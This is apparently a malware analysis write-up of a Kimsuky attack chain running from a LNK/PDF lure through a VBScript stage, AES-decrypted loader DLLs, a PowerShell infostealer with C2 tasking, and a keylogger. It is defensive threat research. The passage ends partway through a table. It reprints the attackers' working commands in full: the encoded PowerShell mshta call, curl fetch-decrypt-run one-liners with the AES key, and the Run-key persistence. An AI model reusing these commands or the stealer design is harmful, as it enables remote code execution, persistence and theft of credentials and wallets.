---
title: "Kimsuky A Stealer With MeshServer"
date: 2026-05-29
categories: [Malware Analysis]
tags: [Malware Analysis]
image: assets/logo/ida-ascii-art.png
---

## 1. Executive Summary

The analyzed artifact is a ZIP-delivered Windows shortcut downloader masquerading as a text document and paired with a PDF lure. The local execution objective is remote payload retrieval through `mshta.exe`, launched by PowerShell `-EncodedCommand` embedded in a `.lnk` file.

The sample targets Microsoft Windows hosts with PowerShell and MSHTML execution support. The initial local evidence confirms an execution chain from the LNK to PowerShell and then to `mshta.exe` with an HTTPS callback to `link24[.]kr`., later retrieved stages provide the native loader, infostealer, keylogger, and MeshAgent.

This specific Kimsuky malware variant utilizes a MeshServer framework to establish communication with its Command and Control (C2) infrastructure and exfiltrate targeted files.

![](https://logpresso.com/media/en/2025-09-22-kimsuky-attack/diagram_1.png)

> Image source: [Cyber Threat Analysis] Kimsuky attack disguised as sex offender notification | LogPresso. Logpresso. https://logpresso.com/en/blog/2025-09-22-kimsuky-attack. Published September 22, 2025.

## 2. Static Analysis

### PDF Lure

The PDF begins with a valid `%PDF-1.7` header. Static marker scanning did not identify `/JavaScript`, `/JS`, `/OpenAction`, `/AA`, `/Launch`, `/URI`, `/EmbeddedFile`, or `/AcroForm` tokens. Based on local evidence, the PDF is assessed as a lure/decoy rather than the execution vector.

### LNK Structure

The LNK header is valid:

```
HeaderSize:      0x0000004C
ShellLink CLSID: 00021401-0000-0000-c000-000000000046
LinkFlags:       0x000840E7
FileAttributes:  0x00000020
Created:         2025-09-09 19:41:00 UTC
Accessed:        2025-09-09 19:41:00 UTC
Modified:        2025-09-09 19:41:00 UTC
```

Recovered strings show the shortcut targets PowerShell and uses text-file masquerading:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Text File
C:\Windows\System32\imageres.dll
%SystemRoot%\System32\imageres.dll
C:\Windows\System32\cmd.exe
```

Embedded PowerShell argument:

```
-e IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBzAGgAdABhACAAIABoAHQAdABwAHMAOgAvAC8AbABpAG4AawAyADQALgBrAHIALwAxAHkAMABtAFoAVABjAA==
```

![](https://www.notion.so/image/attachment%3A11337dfd-f99d-4d63-a31d-61fdc16ed1b0%3Aimage.png?table=block&id=36f26e60-5e7e-80b7-94a0-e9be38177a7c&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=750&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Decoded UTF-16LE payload:

```
               mshta  https://link24.kr/1y0mZTc
```

### Execution Components

- `powershell.exe`: command interpreter and encoded-command launcher.
- `mshta.exe`: remote HTA/script retrieval and execution through MSHTML.

## 3. Initial Execution Flow

### Execution Flow

1. User opens `[non-ASCII].txt.lnk`, likely believing it is a text file due to the `.txt.lnk` double-extension pattern and `imageres.dll` text-file icon metadata.
1. Explorer invokes the LNK target:

```
explorer.exe
  -> powershell.exe -e <Base64 UTF-16LE command>
```

1. PowerShell decodes and executes:

```
mshta https://link24.kr/1y0mZTc
```

1. `mshta.exe` initiates an HTTPS request to `link24.kr` over TCP/443 and attempts to retrieve remote HTA, HTML, scriptlet, or script content.
1. If the remote resource is active and returns executable script, `mshta.exe` may execute JScript/VBScript in-process, instantiate COM objects, launch additional LOLBins, or download a second-stage payload.

### Process Tree Hypothesis

```
explorer.exe
- powershell.exe -e IAAgACAA...
    - mshta.exe https://link24.kr/1y0mZTc
```

## 4. Deep Dive: Reverse Engineering & Code Analysis

### Launcher Logic

The local execution logic is contained in the LNK metadata and PowerShell argument. The shortcut uses a direct interpreter chain instead of embedding a native payload.

Reconstructed launcher pseudocode:

```
int on_lnk_open(void) {
    ShellExecuteW(
        NULL,
        L"open",
        L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        L"-e IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBzAGgAdABhACAAIABoAHQAdABwAHMAOgAvAC8AbABpAG4AawAyADQALgBrAHIALwAxAHkAMABtAFoAVABjAA==",
        NULL,
        SW_SHOWNORMAL
    );
}
```

Decoded command:

```
mshta https://link24.kr/1y0mZTc
```

### C2 / Staging Protocol

```
Initial URL:      https://link24.kr/1y0mZTc
Execution client: mshta.exe
Transport:        TLS over TCP/443
```

---

## 5. Continuation: Retrieved VBScript Stage `pwko.vba`

### Scope

The file `pwko.vba` was provided as the payload retrieved from `https://link24.kr/1y0mZTc`. Static inspection shows it is an HTA-compatible VBScript document, not a native PE and not an Office VBA project. The script starts with:

```
<script language="VBScript">
```

This aligns with the first-stage `mshta.exe` execution path.

## 6. Second-Stage Static Analysis

![](https://www.notion.so/image/attachment%3Ae39df103-2e07-45b0-b658-599614a9cd39%3Aimage.png?table=block&id=36f26e60-5e7e-8070-8864-e180e6e26f83&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The script uses arithmetic `Chr()` construction to hide all operational strings. Example pattern:

```
ss = chr(-65756+CLng("&H10133"))
ss = ss & chr(3966404/CLng("&Hbaac"))
...
Set oShell = CreateObject(ss)
```

Static deobfuscation resolves `ss` at line 16 to:

```
WScript.shell
```

The script then invokes `WScript.Shell.Run` and `WScript.Shell.Exec` to drive `cmd.exe`, `curl.exe`, `sc.exe`, `powershell.exe`, and `rundll32.exe`.

### Recovered Command Sequence

1. Download and open `password.txt`:

```
cmd /c cd /d %temp% && curl -L -o password.txt "https://drive.google.com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ" && password.txt
```

1. Query Microsoft Defender service state:

```
cmd /c sc query WinDefend
```

1. If the `WinDefend` query output contains `STOPPED`, download `user.txt`:

```
cmd /c cd /d %localappdata% && curl -L -o user.txt "https://drive.google.com/uc?export=download&id=1x9mkl4q9ZU8_hDPNF5w0Mu8ePxVWI5VJ"
```

1. Download, decrypt, and execute DLL payload:

```
cmd /c cd /d %localappdata% && curl -L -o sys.log "https://drive.google.com/uc?export=download&id=116azn_9bUov3mkSORbPk8_4zIVVNBHZn" && powershell -Command "[System.IO.File]::WriteAllBytes('sys.dll', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('sys.log'), 0, [System.IO.File]::ReadAllBytes('sys.log').Length))" && del sys.log && rundll32 sys.dll,k
```

1. Download, decrypt, expand, and execute PowerShell payload:

```
cmd /c cd /d %localappdata% && curl -L -o pipe.log "https://drive.google.com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew" && powershell -Command "[System.IO.File]::WriteAllBytes('pipe.zip', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('pipe.log'), 0, [System.IO.File]::ReadAllBytes('pipe.log').Length))" && del pipe.log && powershell Expand-Archive -Path pipe.zip && del pipe.zip
```

1. Execute extracted PowerShell script:

```
cmd /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
```

### AES Payload Decryption

The script uses .NET `System.Security.Cryptography.AesManaged` through PowerShell to decrypt the downloaded blobs.

| Parameter | Value |
| --- | --- |
| Algorithm | AES via `.NET AesManaged` |
| Mode | CBC by default for `AesManaged` unless overridden; no override observed |
| Padding | PKCS7 by default for `AesManaged` unless overridden; no override observed |
| Key | `ftrgmjekglgawkxjynqrwxjvjsydxgjc` |
| Key length | 32 bytes / AES-256 |
| IV | `rhmrpyihmziwkvln` |
| IV length | 16 bytes |
| Ciphertext inputs | `sys.log`, `pipe.log` |
| Plaintext outputs | `sys.dll`, `pipe.zip` |

Pseudocode reconstruction:

```
key = b"ftrgmjekglgawkxjynqrwxjvjsydxgjc"
iv  = b"rhmrpyihmziwkvln"

sys_dll  = AES_256_CBC_PKCS7_Decrypt(read("%LOCALAPPDATA%\\sys.log"), key, iv)
pipe_zip = AES_256_CBC_PKCS7_Decrypt(read("%LOCALAPPDATA%\\pipe.log"), key, iv)

write("%LOCALAPPDATA%\\sys.dll", sys_dll)
write("%LOCALAPPDATA%\\pipe.zip", pipe_zip)
```

### Anti-Analysis / Environment Logic

The script performs a service-state check:

```
sc query WinDefend
```

It reads `StdOut` and gates the `user.txt` download on:

```
If InStr(output, "STOPPED") > 0 Then
```

This is not a full sandbox check, but it is environment-aware branching tied to Microsoft Defender service state. The script does not contain native anti-debugging, anti-VM, or anti-disassembly routines.

## 7. VBScript Execution Flow

If the first-stage LNK is opened and the remote `link24.kr` resource serves `pwko.vba`, the likely process tree becomes:

```
explorer.exe
- powershell.exe -e IAAgACAA...
    - mshta.exe https://link24.kr/1y0mZTc
        - cmd.exe /c cd /d %temp% && curl ... password.txt && password.txt
        - cmd.exe /c sc query WinDefend
        - cmd.exe /c cd /d %localappdata% && curl ... user.txt       [conditional]
        - cmd.exe /c cd /d %localappdata% && curl ... sys.log && powershell ... && rundll32 sys.dll,k
        - cmd.exe /c cd /d %localappdata% && curl ... pipe.log && powershell ... Expand-Archive ...
        - cmd.exe /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
```

The chain stages at least two encrypted payloads. The first is a DLL executed with export/function name `k`; the second is a ZIP archive containing a PowerShell payload and companion log/config file.

---

## 8. Decryption and Archive Expansion

The previously recovered AES parameters successfully decrypted both staged blobs:

```
sys.log  -> sys.dll   (199,680 bytes)
pipe.log -> pipe.zip  (15,431 bytes)
```

`pipe.zip` contains:

```
pipe.zip
- 1.log
- 1.ps1
- 2.log
```

`1.ps1` is a minimal Base64 loader:

![](https://www.notion.so/image/attachment%3A4a297979-fd6b-4e37-988f-f60efa2c8e08%3Aimage.png?table=block&id=36f26e60-5e7e-8048-b3ef-fca034659729&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

This decodes and executes `1.log` or `2.log`. Static decoding produced `decoded_1.ps1` and `decoded_2.ps1`.

![](https://www.notion.so/image/attachment%3Ae0dba281-ddfb-4453-8583-cc80e7b57339%3Aimage.png?table=block&id=36f26e60-5e7e-8095-a361-f54e718a6c56&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 9. Native DLL Stage: `sys.dll`

### PE Characteristics

```
Type:              PE32+ DLL
Architecture:      x64
Machine:           0x8664
Sections:          7
ImageBase:         0x180000000
EntryPoint RVA:    0x0000CF7C
Subsystem:         Windows GUI
Characteristics:   0x2022
DllCharacteristics:0x0140
Export DLL name:   baby.dll
Exported symbol:   k
```

Section table:

| Section | VA | Virtual Size | Raw Size | Characteristics | Entropy |
| --- | --- | --- | --- | --- | --- |
| `.text` | `0x1000` | `0x204AA` | `0x20600` | `0x60000020` | 6.4260 |
| `.rdata` | `0x22000` | `0x970D` | `0x9800` | `0x40000040` | 4.8010 |
| `.data` | `0x2C000` | `0x4BD0` | `0x2000` | `0xC0000040` | 3.4755 |
| `.pdata` | `0x31000` | `0x1CBC` | `0x1E00` | `0x40000040` | 7.8678 |
| `.gRy` | `0x33000` | `0x222C` | `0x2400` | `0x68000020` | 5.6184 |
| `.rsrc` | `0x36000` | `0x1B2` | `0x200` | `0x40000040` | 4.4745 |
| `.reloc` | `0x37000` | `0x500` | `0x600` | `0x42000040` | 5.0027 |

![](https://www.notion.so/image/attachment%3A60e62a78-47ec-4cca-81f3-706f5e1e4f27%3Asys.dll.Entropy.png?table=block&id=36f26e60-5e7e-80e6-a6aa-eab959f2685b&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The nonstandard executable section `.gRy` and high `.pdata` entropy are anomalous. No known packer signature was confirmed from static headers alone.

### Imports and Capability Surface

Suspicious imports include:

| DLL | APIs | Assessment |
| --- | --- | --- |
| `WININET.dll` | `InternetOpenA`, `InternetOpenUrlA`, `InternetReadFile`, `DeleteUrlCacheEntry`, `InternetCloseHandle` | HTTP(S) retrieval and cache cleanup. |
| `KERNEL32.dll` | `CreateProcessA`, `VirtualAlloc`, `VirtualProtect`, `VirtualProtectEx`, `WriteProcessMemory`, `ReadProcessMemory`, `GetThreadContext`, `SetThreadContext`, `Wow64GetThreadContext`, `Wow64SetThreadContext`, `ResumeThread`, `OpenProcess`, `TerminateProcess`, `CreateThread` | Process injection / hollowing-capable API set. |
| `KERNEL32.dll` | `CreateMutexA`, `GetNativeSystemInfo`, `Sleep`, `GetEnvironmentVariableA`, `CopyFileA`, `DeleteFileA` | Single-instance control, environment discovery, staging, cleanup. |
| `ADVAPI32.dll` | `RegOpenKeyExA`, `RegCloseKey` | Registry probing. |
| `SHELL32.dll` | `SHGetSpecialFolderPathA`, `ShellExecuteA` | Known-folder resolution and process/file launch. |

Recovered strings:

```
SOFTWARE\VMware, Inc.\VMware Tools
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
\Taskmgr.exe
%s\Temp\Taskmgr.exe
%s\user.txt
\Google\Chrome\Application\chrome.exe
\Microsoft\Edge\Application\msedge.exe
Virtual Protect Failed!
Writing to the remote process failed!
[ERROR] CreateProcess failed, Error =
src\pe_raw_to_virtual.cpp
```

Static assessment: `sys.dll` is a native loader/injector component. The API set and strings indicate anti-VM registry probing, staging as `Taskmgr.exe`, interaction with `user.txt`, and likely remote-process payload mapping into Chromium-family browser processes or a spawned masqueraded process.

### GetSystemDirectoryA

![](https://www.notion.so/image/attachment%3A99fbbdc7-6a1c-4bb0-be5b-fc95c335065d%3Aimage.png?table=block&id=36f26e60-5e7e-809b-888c-e14cecb8d5cb&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=950&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### SHGetSpecialFolderPathA

![](https://www.notion.so/image/attachment%3Acdac8100-2775-4fe2-ac00-67bb7a2276e2%3Aimage.png?table=block&id=36f26e60-5e7e-8041-a5f4-fcab90565053&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### Anti-VM

![](https://www.notion.so/image/attachment%3Ad3a028de-1dae-4a4d-b46e-cf9026e5cf68%3Aimage.png?table=block&id=36f26e60-5e7e-80e8-88bf-e93721588871&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 10. PowerShell RAT / Infostealer Stage: `decoded_1.ps1`

### Initialization and C2 Bootstrap

![](https://www.notion.so/image/attachment%3Adf425333-ac1f-4f4d-8154-602eff15de36%3Aimage.png?table=block&id=36f26e60-5e7e-801e-a1d7-cf38d29e73f9&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The script derives a victim ID from:

```
(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
```

the output will be `XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX`

It creates a per-host staging directory:

```
%TEMP%\<UUID>\
```

It downloads an AES-encrypted C2 base URL from Google Drive:

```
hxxps://drive.google[.]com/uc?export=download&id=1FA9TvcakCgfeRdLaejIJbeoFjuI9GB6R
```

The same AES key/IV are used to decrypt the C2 base URL:

```
Key: ftrgmjekglgawkxjynqrwxjvjsydxgjc
IV:  rhmrpyihmziwkvln
```

![](https://www.notion.so/image/attachment%3A7ed7f6b9-f7d9-4484-af3e-043e35414608%3Aimage.png?table=block&id=36f26e60-5e7e-80bd-bcfb-d6563ba80602&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### Mutex and Anti-VM

Single-instance mutex:

```
zcjwmdmj
```

Anti-VM checks query:

```
Win32_ComputerSystem
Win32_BIOS
Win32_DiskDrive
```

Matched virtualization strings include:

```
Virtual
VMware
KVM
VirtualBox
VBOX
Xen
QEMU
Amazon
Google
innotek
Google PersistentDisk
```

On match, the script invokes its cleanup routine and exits.

### Persistence

Persistence is installed via current-user Run key:

```
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Name:  WindowsSecurityCheck
Value: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File %LOCALAPPDATA%\pipe\1.ps1 -FileName %LOCALAPPDATA%\pipe\1.log
```

### Collection Capabilities

The PowerShell stage implements broad infostealer functionality:

- Browser credential and bookmark collection from Chrome, Edge, Naver Whale, and Firefox.
- DPAPI master-key recovery through `System.Security.Cryptography.ProtectedData.Unprotect`.
- Cryptocurrency wallet extension collection from Chromium `Local Extension Settings` and `IndexedDB` paths.
- Telegram Desktop collection from `%APPDATA%\Telegram Desktop\tdata`.
- Discord collection from `%APPDATA%\discord`, including `Local State` key extraction and `Local Storage\leveldb` copy.
- Windows Recent shortcut target extraction.
- System inventory collection: OS, CPU, physical disk, volumes, processes, installed software, UAC setting, privilege level.
- NPKI/GPKI certificate archive collection from `%USERPROFILE%\AppData\LocalLow\NPKI` and `C:\GPKI`.
- File discovery across drives for extensions and wallet-related name patterns.

Target file extensions:

```
.txt, .doc, .csv, .docx, .xls, .xlsx, .pdf, .hwp, .hwpx,
.jpg, .jpeg, .png, .rar, .zip, .alz, .eml, .ldb, .log, .dat
```

Target filename patterns:

```
wallet, UTC--, blockchain, keystore, privatekey, metamask, phrase, ledger, myether, dcent
```

### C2 Protocol

`decoded_1.ps1` implements HTTP(S) polling against the decrypted `$serverurl`, using victim UUID as the primary identifier.

| Endpoint Pattern | Purpose |
| --- | --- |
| `$serverurl?id=$id` | Upload collected archives and staged files. |
| `$serverurl?id=$id&ap=1` | Upload keylogger output `k.log`. |
| `$serverurl$id/appkey` | Poll app-key tasking. |
| `$serverurl?id=$id&del=appkey` | Delete/ack app-key tasking. |
| `$serverurl$id/rd` | Poll read-file tasking. |
| `$serverurl?id=$id&del=rd` | Delete/ack read-file tasking. |
| `$serverurl$id/wr` | Poll write-file tasking. |
| `$serverurl$id/<filename>` | Download file content for write-file tasking. |
| `$serverurl?id=$id&del=<filename>` | Delete/ack downloaded file. |
| `$serverurl$id/cm` | Poll command tasking. |
| `$serverurl?id=$id&del=cm` | Delete/ack command tasking. |

Tasking behavior:

- `rd`: upload arbitrary files or zipped directories requested by the operator.
- `wr`: download operator-provided files to attacker-selected paths.
- `cm`: execute operator-supplied PowerShell through `Invoke-Expression`.
- `appkey`: download and run an additional AES-encrypted DLL.

### Additional App-Key DLL Stage

The script can fetch another encrypted DLL:

```
hxxps://drive.google[.]com/uc?export=download&id=15Xkvt3TwCQJERcUHSUandCigMVVxsFqr
```

It decrypts the blob with the same AES key/IV and runs:

```
rundll32.exe %TEMP%\appload.dll,z
```

This indicates at least one additional native plugin/component, likely dedicated to application credential or cookie extraction.

Example the content that they try to steal when run:

![](https://www.notion.so/image/attachment%3Adbb77a98-73ba-4d3b-a95b-d541f6d92411%3Aimage.png?table=block&id=36f26e60-5e7e-802a-ab3d-e7c1c4baaa2c&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1200&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 11. Keylogger Stage: `decoded_2.ps1`

![](https://www.notion.so/image/attachment%3Ac387c630-4302-4b8c-b49a-545a97915c5a%3Aimage.png?table=block&id=36f26e60-5e7e-80d3-b929-dc882cf5b344&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

`decoded_2.ps1` defines `Keylog` and uses inline C# P/Invoke against `user32.dll`.

![](https://www.notion.so/image/attachment%3A3fd4da69-c40f-4c6e-a3d2-16f2abf0462d%3Aimage.png?table=block&id=36f26e60-5e7e-8084-8237-ef9533ee1d80&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Imported APIs:

```
GetAsyncKeyState
GetKeyboardState
MapVirtualKey
ToUnicode
GetForegroundWindow
GetWindowText
```

Behavior:

- Polls virtual keys from ASCII range `8..254`.
- Converts key states to Unicode with `ToUnicode`.
- Records active foreground window title changes.
- Captures clipboard content through `Get-Clipboard -Raw`.
- Buffers key and clipboard/window data and writes to `%TEMP%\<UUID>\k.log`.
- The main RAT uploads `k.log` to `$serverurl?id=$id&ap=1`.

## 12. End-to-End Behavioral Model

Static reconstruction of the complete chain:

```
tax_refund.zip
- [non-ASCII].txt.lnk
    - powershell.exe -EncodedCommand
        - mshta.exe https://link24.kr/1y0mZTc
            - VBScript pwko.vba
                - curl -> password.txt; shell-open password.txt
                - sc query WinDefend
                - curl -> user.txt                         [conditional on WinDefend STOPPED]
                - curl -> sys.log; AES decrypt -> sys.dll; rundll32 sys.dll,k
                - curl -> pipe.log; AES decrypt -> pipe.zip; Expand-Archive
                    - powershell.exe -File 1.ps1 -FileName 1.log
                        - decode/execute 1.log -> decoded_1.ps1
                        - install HKCU Run persistence
                        - collect browser, wallet, Telegram, Discord, cert, recent-file, and system data
                        - poll C2 for rd/wr/cm/appkey tasking
                        - launch second loader instance with 2.log
                            - decode/execute 2.log -> decoded_2.ps1 keylogger
```

---

## 13. C2 Bootstrap and App-Key Native Plugin

### Scope

Two additional artifacts referenced by `decoded_1.ps1` were retrieved and placed in the analysis directory:

- `pserver.log`: AES-encrypted C2 bootstrap downloaded from Google Drive ID `1FA9TvcakCgfeRdLaejIJbeoFjuI9GB6R`.
- `appload.log`: AES-encrypted native plugin downloaded from Google Drive ID `15Xkvt3TwCQJERcUHSUandCigMVVxsFqr`.

Both blobs were decrypted offline with the previously recovered AES parameters:

```
Key: ftrgmjekglgawkxjynqrwxjvjsydxgjc
IV:  rhmrpyihmziwkvln
```

### Decrypted C2 Bootstrap

`pserver.log` decrypts to the final C2 base URL:

```
https://lutkdd.corpsecs.com/
```

This value populates `$serverurl` in `decoded_1.ps1`, enabling the previously reconstructed endpoints:

```
https://lutkdd.corpsecs.com/?id=<UUID>
https://lutkdd.corpsecs.com/<UUID>/rd
https://lutkdd.corpsecs.com/<UUID>/wr
https://lutkdd.corpsecs.com/<UUID>/cm
https://lutkdd.corpsecs.com/<UUID>/appkey
```

![](https://www.notion.so/image/attachment%3A1dbc3446-021b-459d-a85a-c822ffe3139d%3Aimage.png?table=block&id=36f26e60-5e7e-8068-b3f0-ea8c1f0c71e4&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The operator tasking model therefore uses Google Drive for staged payload hosting and `lutkdd.corpsecs.com` for victim registration, exfiltration, polling, file transfer, and command execution.

## 14. Native Plugin: `appload.dll`

### PE Characteristics

```
Type:               PE32+ DLL
Architecture:       x64
Machine:            0x8664
Sections:           6
ImageBase:          0x180000000
EntryPoint RVA:     0x0000AEDC
Subsystem:          Windows GUI
Characteristics:    0x2022
DllCharacteristics: 0x0140
Export DLL name:    baby.dll
Exported symbol:    z
```

Section table:

| Section | VA | Virtual Size | Raw Size | Characteristics | Entropy |
| --- | --- | --- | --- | --- | --- |
| `.text` | `0x1000` | `0x1E9E6` | `0x1EA00` | `0x60000020` | 6.4309 |
| `.rdata` | `0x20000` | `0x920D` | `0x9400` | `0x40000040` | 4.7664 |
| `.data` | `0x2A000` | `0x4950` | `0x2000` | `0xC0000040` | 3.4766 |
| `.pdata` | `0x2F000` | `0x1AAC` | `0x1C00` | `0x40000040` | 5.0979 |
| `.rsrc` | `0x31000` | `0x1B4` | `0x200` | `0x40000040` | 5.1197 |
| `.reloc` | `0x32000` | `0x7BC` | `0x800` | `0x42000040` | 4.1685 |

![](https://www.notion.so/image/attachment%3A31349609-0051-4778-bab3-2a5b57032634%3Aappload.dll.Entropy.png?table=block&id=36f26e60-5e7e-80db-862c-c2aafe636d98&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The export name `baby.dll` overlaps with `sys.dll`, but the exported symbol differs: `appload.dll` exports `z`, matching the execution command in `decoded_1.ps1`:

```
rundll32.exe %TEMP%\appload.dll,z
```

![](https://www.notion.so/image/attachment%3A4b773903-498e-4051-8405-ec1d2f984756%3Aimage.png?table=block&id=36f26e60-5e7e-802f-8ed3-efff2e8619ca&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### Imports and Capability Surface

`appload.dll` imports the same core loader/injection API family observed in `sys.dll`:

| DLL | APIs | Assessment |
| --- | --- | --- |
| `WININET.dll` | `InternetOpenA`, `InternetOpenUrlA`, `InternetReadFile`, `DeleteUrlCacheEntry`, `InternetCloseHandle` | HTTP(S) retrieval and cache cleanup. |
| `KERNEL32.dll` | `CreateProcessA`, `VirtualAlloc`, `VirtualProtectEx`, `WriteProcessMemory`, `ReadProcessMemory`, `GetThreadContext`, `SetThreadContext`, `Wow64GetThreadContext`, `Wow64SetThreadContext`, `ResumeThread`, `OpenProcess`, `TerminateProcess` | Process injection / hollowing-capable API set. |
| `KERNEL32.dll` | `CopyFileA`, `DeleteFileA`, `CreateFileMappingA`, `MapViewOfFile`, `UnmapViewOfFile`, `Sleep` | Staging, cleanup, memory-mapped payload handling, timing. |
| `SHELL32.dll` | `SHGetSpecialFolderPathA` | Known-folder discovery. |

Recovered strings:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
https://drive.google.com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc
\Google\Chrome\Application\chrome.exe
\Microsoft\Edge\Application\msedge.exe
\Taskmgr.exe
%s\Temp\Taskmgr.exe
%s\Temp\Taskmgr.msh
https://drive.google.com/uc?export=download&id=1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr
https://drive.google.com/uc?export=download&id=176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m
Virtual Protect Failed!
Writing to the remote process failed!
src\pe_raw_to_virtual.cpp
```

Static assessment: `appload.dll` is an additional native loader/plugin component. Its strings and import table indicate the same PE-loader/process-injection framework as `sys.dll`, but its execution context is explicitly tied to the PowerShell RATâ€™s `GetAppKey` routine.

The `cc_appkey` and `ee_appkey` upload logic in `decoded_1.ps1`, combined with browser-targeting strings in `appload.dll`, suggests this plugin is used to acquire application/browser keys or cookie material that the PowerShell collector later exfiltrates.

## 15. Updated C2 Protocol With Decrypted Base URL

The full C2 protocol can now be concretely resolved:

| URL | Method / Action | Purpose |
| --- | --- | --- |
| `hxxps://lutkdd[.]corpsecs[.]com/?id=<UUID>` | Multipart upload | Initial archive, file-list archive, arbitrary file exfiltration. |
| `hxxps://lutkdd[.]corpsecs[.]com/?id=<UUID>&ap=1` | Multipart upload | Keylogger output `k.log`. |
| `hxxps://lutkdd[.]corpsecs[.]com/<UUID>/appkey` | GET | Poll app-key plugin tasking. |
| `hxxps://lutkdd[.]corpsecs[.]com/?id=<UUID>&del=appkey` | GET | Acknowledge/delete app-key tasking. |
| `hxxps://lutkdd[.]corpsecs[.]com/<UUID>/rd` | GET | Poll read-file tasking. |
| `hxxps://lutkdd[.]corpsecs[.]com/?id=<UUID>&del=rd` | GET | Acknowledge/delete read-file tasking. |
| `hxxps://lutkdd[.]corpsecs[.]com/<UUID>/wr` | GET | Poll write-file tasking. |
| `hxxps://lutkdd[.]corpsecs[.]com/<UUID>/<filename>` | GET | Download operator-provided file. |
| `hxxps://lutkdd[.]corpsecs[.]com/?id=<UUID>&del=<filename>` | GET | Acknowledge/delete downloaded operator file. |
| `hxxps://lutkdd[.]corpsecs[.]com/<UUID>/cm` | GET | Poll PowerShell command tasking. |
| `hxxps://lutkdd[.]corpsecs[.]com/?id=<UUID>&del=cm` | GET | Acknowledge/delete command tasking. |

---

## 16. Continuation: Auxiliary Payloads Referenced by `appload.dll`

### Scope

Three additional payload blobs referenced by `appload.dll` were retrieved and placed in the analysis directory:

- `app64.log` from Google Drive ID `1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc`.
- `agent.log` from Google Drive ID `1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr`.
- `msh.log` from Google Drive ID `176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m`.

All three artifacts are high-entropy opaque blobs. The AES-CBC key/IV used for prior stages did not successfully decrypt these files. Static assessment is therefore limited to file identity, entropy, header bytes, correlation with `appload.dll` strings, and inferred runtime handling by the native plugin.

## 17. `appload.dll` Decompilation Notes

### Exported Entry

```
Export DLL name: baby.dll
Export:          z
Export RVA:      0x00001790
Invocation:      rundll32 appload.dll,z
```

Export stub bytes:

```
40 55 48 8D AC 24 50 F8 FF FF 48 81 EC B0 08 00 00
48 8B 05 08 92 02 00 48 33 C4 48 89 85 A0 07 00 00
48 8D 4D 31 33 D2 41 B8 03 01 00 00 ...
```

The export allocates a large local frame (`0x8B0`) and immediately initializes several stack buffers through repeated internal calls. This is consistent with runtime construction of URLs/paths before network retrieval and staging.

### Import Call-Site Highlights

High-signal call sites resolved from `.text`:

| API | Call Sites |
| --- | --- |
